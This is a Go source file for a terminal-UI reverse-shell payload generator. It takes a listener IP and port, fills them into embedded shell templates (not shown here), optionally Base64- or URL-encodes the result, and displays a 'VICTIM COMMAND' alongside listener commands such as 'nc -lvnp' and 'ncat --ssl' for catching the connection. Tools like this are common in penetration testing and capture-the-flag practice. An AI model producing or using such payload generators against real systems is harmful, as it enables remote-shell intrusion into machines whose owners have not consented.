package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"net/url"
	"os"
	"strings"

	"github.com/atotto/clipboard"
	"github.com/charmbracelet/bubbles/list"
	"github.com/charmbracelet/bubbles/textinput"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

// --- Constantes & Styles ---
var (
	generalSpacing      = 2
	focusBorderColor    = lipgloss.Color("5")
	inactiveBorderColor = lipgloss.Color("8")
	focusColor          = lipgloss.Color("5")
	inactiveColor       = lipgloss.Color("8")
	greenColor          = lipgloss.Color("2")
	subTextColor        = lipgloss.Color("8")
	whiteColor          = lipgloss.Color("15")

	appStyle            = lipgloss.NewStyle().Padding(generalSpacing)
	baseBlockStyle      = lipgloss.NewStyle().Border(lipgloss.ThickBorder()).Padding(0, generalSpacing)
	labelStyle          = lipgloss.NewStyle().Foreground(subTextColor).MarginTop(1)
	activeOptionStyle   = lipgloss.NewStyle().Foreground(focusColor).Bold(true)
	inactiveOptionStyle = lipgloss.NewStyle().Foreground(inactiveColor)
	helpStyle           = lipgloss.NewStyle().Foreground(subTextColor).Italic(true).Align(lipgloss.Center)
)

// --- Types ---
type Shell struct {
	Name, Command string
	Meta          []string
}

func (s Shell) Title() string       { return s.Name }
func (s Shell) Description() string { return "Meta: " + strings.Join(s.Meta, ", ") }
func (s Shell) FilterValue() string { return s.Name }

type EncodingType int

const (
	None EncodingType = iota
	Base64
	URL
	DoubleURL
)

type Listener struct {
	Name, Template string
}

type Model struct {
	inputs           []textinput.Model
	activeBlock      int // 0: Config, 1: Liste Shells
	inputIndex       int // 0: IP, 1: Port, 2: Sélecteur Listener
	shellList        list.Model
	shells           []Shell
	selectedShell    Shell
	encoding         EncodingType
	interfaces       []struct{ Name, IP string }
	currentInterface int
	listeners        []Listener
	listenerIndex    int
	width, height    int
}

// --- Main ---
func main() {
	p := tea.NewProgram(initialModel(), tea.WithAltScreen())
	if _, err := p.Run(); err != nil {
		fmt.Printf("Erreur: %v\n", err)
		os.Exit(1)
	}
}

func initialModel() Model {
	// Chargement des Shells depuis la source Go
	shells := EmbeddedShells

	// Détection Interfaces Réseau
	var ifaces []struct{ Name, IP string }
	netIfaces, _ := net.Interfaces()
	for _, i := range netIfaces {
		addrs, _ := i.Addrs()
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
				ifaces = append(ifaces, struct{ Name, IP string }{i.Name, ipnet.IP.String()})
			}
		}
	}
	if len(ifaces) == 0 {
		ifaces = append(ifaces, struct{ Name, IP string }{"local", "127.0.0.1"})
	}

	// Champs de saisie (IP/Port)
	inputs := make([]textinput.Model, 2)
	greenPrompt := lipgloss.NewStyle().Foreground(lipgloss.Color("43"))

	inputs[0] = textinput.New()
	inputs[0].Placeholder = "10.10.10.10"
	inputs[0].SetValue(ifaces[0].IP)
	inputs[0].Prompt = "Listener IP : "
	inputs[0].CharLimit = 15
	inputs[0].PromptStyle = greenPrompt
	inputs[0].Focus()

	inputs[1] = textinput.New()
	inputs[1].Placeholder = "9001"
	inputs[1].Prompt = "Listener Port : "
	inputs[1].CharLimit = 5
	inputs[1].PromptStyle = greenPrompt

	// Liste des options
	items := make([]list.Item, len(shells))
	for i, s := range shells {
		items[i] = s
	}

	d := list.NewDefaultDelegate()
	d.Styles.SelectedTitle = d.Styles.SelectedTitle.Foreground(focusBorderColor).BorderForeground(focusBorderColor)
	d.Styles.SelectedDesc = d.Styles.SelectedDesc.Foreground(focusBorderColor).BorderForeground(focusBorderColor)

	l := list.New(items, d, 0, 0)
	l.SetShowHelp(false)
	l.SetShowTitle(false)
	l.SetHeight(8)

	return Model{
		inputs:        inputs,
		shellList:     l,
		shells:        shells,
		selectedShell: shells[0],
		interfaces:    ifaces,
		listeners: []Listener{
			{"netcat (nc)", "nc -lvnp {port}"},
			{"ncat", "ncat -lvnp {port}"},
			{"ncat (ssl)", "ncat --ssl -lvnp {port}"},
			{"socat", "socat -d -d TCP-LISTEN:{port} STDOUT"},
			{"rustcat", "rcat -lp {port}"},
			{"pwncat", "python3 -m pwncat.cx.bind 0.0.0.0:{port}"},
			{"powercat (Win)", "powercat -l -p {port}"},
		},
	}
}

func (m Model) Init() tea.Cmd { return textinput.Blink }

func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmds []tea.Cmd

	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c", "q":
			return m, tea.Quit
		case "tab", "shift+tab":
			// Basculer entre Config et Liste
			m.activeBlock = 1 - m.activeBlock
			m.inputs[0].Blur()
			m.inputs[1].Blur()
			if m.activeBlock == 0 && m.inputIndex < 2 {
				m.inputs[m.inputIndex].Focus()
			}
			return m, nil
		case "ctrl+y":
			p, l := m.generatePayload()
			clipboard.WriteAll(p + "\n" + l)
			return m, nil
		}

		if m.activeBlock == 0 {
			// Navigation Bloc Config
			switch msg.String() {
			case "up", "shift+tab":
				m.inputIndex = max(0, m.inputIndex-1)
			case "down", "enter", "tab":
				m.inputIndex = min(2, m.inputIndex+1)
			case "ctrl+n":
				if m.inputIndex == 0 && len(m.interfaces) > 0 {
					m.currentInterface = (m.currentInterface + 1) % len(m.interfaces)
					m.inputs[0].SetValue(m.interfaces[m.currentInterface].IP)
				}
			case "left", "h":
				if m.inputIndex == 2 {
					m.listenerIndex = (m.listenerIndex - 1 + len(m.listeners)) % len(m.listeners)
				}
			case "right", "l":
				if m.inputIndex == 2 {
					m.listenerIndex = (m.listenerIndex + 1) % len(m.listeners)
				}
			}

			m.inputs[0].Blur()
			m.inputs[1].Blur()
			if m.inputIndex < 2 {
				m.inputs[m.inputIndex].Focus()
			}
		} else {
			// Navigation Liste & Encodage
			switch msg.String() {
			case "n", "N":
				m.encoding = None
			case "b", "B":
				m.encoding = Base64
			case "u", "U":
				m.encoding = URL
			case "d", "D":
				m.encoding = DoubleURL
			default:
				var cmd tea.Cmd
				m.shellList, cmd = m.shellList.Update(msg)
				if i, ok := m.shellList.SelectedItem().(Shell); ok {
					m.selectedShell = i
				}
				cmds = append(cmds, cmd)
			}
		}

	case tea.WindowSizeMsg:
		m.width, m.height = msg.Width, msg.Height
		m.shellList.SetWidth((msg.Width / 2) - 10)
	}

	if m.activeBlock == 0 && m.inputIndex < 2 {
		for i := range m.inputs {
			var cmd tea.Cmd
			m.inputs[i], (cmd) = m.inputs[i].Update(msg)
			cmds = append(cmds, cmd)
		}
	}
	return m, tea.Batch(cmds...)
}

func (m Model) View() string {
	availableWidth := m.width - (2 * generalSpacing)
	if availableWidth < 0 {
		availableWidth = 0
	}

	// Calculs de mise en page
	gapSize := 4
	borderCost := 2

	totalContentWidth := availableWidth - gapSize - (2 * borderCost)
	if totalContentWidth < 0 {
		totalContentWidth = 0
	}

	targetConfigContentWidth := (totalContentWidth / 2) - 6
	if targetConfigContentWidth < 20 {
		targetConfigContentWidth = 20
	}

	targetListContentWidth := totalContentWidth - targetConfigContentWidth
	if targetListContentWidth < 10 {
		targetListContentWidth = 10
	}

	m.shellList.SetWidth(targetListContentWidth - 2)

	// Bloc IP/Port/Listener
	arrowL, arrowR := " ", " "
	lsStyle := lipgloss.NewStyle().Foreground(whiteColor)
	if m.activeBlock == 0 && m.inputIndex == 2 {
		lsStyle = lsStyle.Foreground(focusColor).Bold(true)
		arrowL, arrowR = "< ", " >"
	}

	ifaceLabel := ""
	for _, iface := range m.interfaces {
		if iface.IP == m.inputs[0].Value() {
			ifaceLabel = lipgloss.NewStyle().Foreground(greenColor).Render("󰈀 " + iface.Name)
			break
		}
	}

	ifaceLabelFormatted := lipgloss.NewStyle().MarginBottom(1).Render(ifaceLabel)
	if ifaceLabel == "" && len(m.interfaces) > 0 {
		ifaceLabelFormatted = lipgloss.NewStyle().MarginBottom(1).Foreground(subTextColor).Render("(Ctrl+n: Switch)")
	} else if ifaceLabel == "" {
		ifaceLabelFormatted = lipgloss.NewStyle().MarginBottom(1).Render("")
	}
	configContent := lipgloss.NewStyle().Padding(1).Render(lipgloss.JoinVertical(lipgloss.Left,
		labelStyle.MarginBottom(1).Render("Listener settings"), m.inputs[0].View(), ifaceLabelFormatted,
		m.inputs[1].View(),
		labelStyle.MarginBottom(1).Render("\nTool Selection"),
		fmt.Sprintf("%s%s%s", lipgloss.NewStyle().Foreground(subTextColor).Render(arrowL), lsStyle.Render(m.listeners[m.listenerIndex].Name), lipgloss.NewStyle().Foreground(subTextColor).Render(arrowR)),
	))

	// Bloc Options
	encOpts := []string{"[N]one", "[B]ase64", "[U]rl", "[D]oubleUrl"}
	encLine := ""
	for i, opt := range encOpts {
		style := inactiveOptionStyle
		if EncodingType(i) == m.encoding {
			style = activeOptionStyle
		}
		encLine += style.Render(opt) + "  "
	}
	optionsContent := lipgloss.NewStyle().Padding(1).Render(lipgloss.JoinVertical(lipgloss.Left, m.shellList.View(), labelStyle.MarginBottom(1).Render("Encoding"), encLine))

	// Ligne Supérieure
	topHeight := max(15, lipgloss.Height(optionsContent)+2)
	configBlock := renderBlock(configContent, m.activeBlock == 0, targetConfigContentWidth, topHeight)
	optionsBlock := renderBlock(optionsContent, m.activeBlock == 1, targetListContentWidth, topHeight)

	topRow := lipgloss.JoinHorizontal(lipgloss.Top, configBlock, lipgloss.NewStyle().Width(gapSize).Render(" "), optionsBlock)

	// Bloc Sortie (Payload)
	outContentWidth := availableWidth - 2
	payload, listener := m.generatePayload()

	outPadding := 3

	outContent := lipgloss.JoinVertical(lipgloss.Left,
		lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("#A0C4FF")).Render("VICTIM COMMAND :"),
		lipgloss.NewStyle().Foreground(focusColor).Width(outContentWidth-(2*outPadding)).Render(payload),
		"\n",
		lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("#A0C4FF")).Render("LISTENER COMMAND :"),
		lipgloss.NewStyle().Foreground(greenColor).Render(listener),
	)

	// Rendu Bloc Sortie avec Padding
	renderOutputBlock := func(content string, w int) string {
		return baseBlockStyle.Copy().
			Padding(outPadding).
			Width(w).
			BorderForeground(inactiveBorderColor).
			Render(content)
	}

	return appStyle.Render(lipgloss.JoinVertical(lipgloss.Left,
		topRow,
		lipgloss.NewStyle().Height(gapSize-2).Render(""),
		renderOutputBlock(outContent, outContentWidth),
		"\n", // Saut de ligne avant l'aide
		helpStyle.Width(availableWidth).Render("󰌒 Tab: Switch Block •  Ctrl+Y: Copy • 󰈆 q: Quit • 󰀂 Ctrl+n: Switch IFace"),
	))
}

// Génération du payload final
func (m Model) generatePayload() (string, string) {
	ip, port := m.inputs[0].Value(), m.inputs[1].Value()
	if ip == "" {
		ip = "10.10.10.10"
	}
	if port == "" {
		port = "9001"
	}

	r := strings.NewReplacer("{shell}", "/bin/bash", "{ip}", ip, "{port}", port)
	payload := r.Replace(m.selectedShell.Command)

	switch m.encoding {
	case Base64:
		payload = base64.StdEncoding.EncodeToString([]byte(payload))
	case URL:
		payload = url.QueryEscape(payload)
	case DoubleURL:
		payload = url.QueryEscape(url.QueryEscape(payload))
	}

	return payload, strings.ReplaceAll(m.listeners[m.listenerIndex].Template, "{port}", port)
}

func renderBlock(content string, active bool, w, h int) string {
	c := inactiveBorderColor
	if active {
		c = focusBorderColor
	}
	return baseBlockStyle.Copy().BorderForeground(c).Width(w).Height(h).Render(content)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}
